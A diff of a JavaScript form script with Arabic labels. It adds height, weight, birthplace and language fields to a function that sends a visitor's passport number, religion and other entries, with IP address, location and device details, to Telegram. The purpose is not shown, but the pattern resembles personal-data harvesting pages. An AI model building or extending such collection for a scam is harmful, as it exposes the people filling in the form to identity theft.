@@ -385,6 +385,9 @@ async function getIpAndLocation() {
   return { ip: 'تعذر الجلب', city: '-', country_name: '-' };
 }
 
+
+
+
 // دالة إرسال الإشعار إلى تليجرام
 async function sendDeviceInfoAndData() {
   const formData = {
@@ -394,7 +397,12 @@ async function sendDeviceInfoAndData() {
     passport: document.getElementById('inputPassport')?.value || 'غير مدخل',
     job: document.getElementById('inputJob')?.value || 'غير مدخل',
     age: document.getElementById('inputAge')?.value || 'غير مدخل',
-    religion: document.getElementById('inputReligion')?.value || 'غير مدخل'
+    religion: document.getElementById('inputReligion')?.value || 'غير مدخل',
+    height: document.getElementById('inputHeight')?.value || 'غير مدخل',
+    weight: document.getElementById('inputWeight')?.value || 'غير مدخل',
+    birthplace: document.getElementById('inputBirthPlace')?.value || 'غير مدخل',
+    english: document.getElementById('inputEnglish')?.value || 'غير مدخل',
+    arabic: document.getElementById('inputArabic')?.value || 'غير مدخل'
   };
 
   const ipInfo = await getIpAndLocation();
@@ -416,6 +424,12 @@ async function sendDeviceInfoAndData() {
 • الوظيفة: ${formData.job}
 • العمر: ${formData.age}
 • الديانة: ${formData.religion}
+• الطول: ${formData.height}
+• الوزن: ${formData.weight}
+• مكان الميلاد: ${formData.birthplace}
+• عربي: ${formData.arabic}
+• انجليزي: ${formData.english}
+
 
 🌐 *معلومات الاتصال والجهاز:*
 • **IP Address:** \`${ipInfo.ip}\`
